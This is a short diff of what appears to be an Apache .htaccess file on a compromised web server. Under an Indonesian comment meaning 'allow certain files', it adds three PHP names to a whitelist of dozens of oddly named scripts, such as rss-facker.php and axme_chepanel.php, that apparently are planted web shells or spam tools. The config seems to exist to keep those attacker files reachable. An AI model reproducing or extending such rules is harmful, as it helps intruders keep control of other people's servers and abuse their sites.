@@ -10,7 +10,7 @@ Require all granted
 </FilesMatch>
 
 # Izinkan file tertentu
-<FilesMatch '^(body.php|Wns.php|Tesk.php|Wns.php|stat.php|copymarketing.php|file.php|telegram.php|body.php|Sear.php|body.php|stone_hinges.php|erode-light-demo.php|generator_config_file.php|loggofile.php|WSC.php|tyeword.php|unitpss.php|body.php|folder.php|resin-apln-5.php|bopp-apln-7.php|W.cut.php|1_3.php|class-memlbe.php|rss-facker.php|Sans_folder.php|Sans_sms.php|zh.kj.php|ancur.php|Prias.php|info.php|Full_bes.php|File.php|axme_chepanel.php|acme_chane.php|sportime.php|index.php|select5.php|Exiper.php|class-wp-GSS.php|code.php|false.php|dila.php|google.php|info.php|index1.php|info.php|file.php|filev2.php|filev3.php)$'>
+<FilesMatch '^(body.php|Wns.php|Tesk.php|Wns.php|stat.php|copymarketing.php|file.php|telegram.php|body.php|Sear.php|body.php|stone_hinges.php|erode-light-demo.php|generator_config_file.php|loggofile.php|WSC.php|tyeword.php|unitpss.php|body.php|folder.php|resin-apln-5.php|bopp-apln-7.php|W.cut.php|1_3.php|class-memlbe.php|rss-facker.php|Sans_folder.php|Sans_sms.php|zh.kj.php|ancur.php|Prias.php|info.php|Full_bes.php|File.php|axme_chepanel.php|acme_chane.php|sportime.php|index.php|select5.php|Exiper.php|class-wp-GSS.php|code.php|false.php|dila.php|google.php|info.php|index1.php|info.php|file.php|filev2.php|filev3.php|newv.php|new_v1.php|newcutv2.php)$'>
 Require all granted
 </FilesMatch>
 
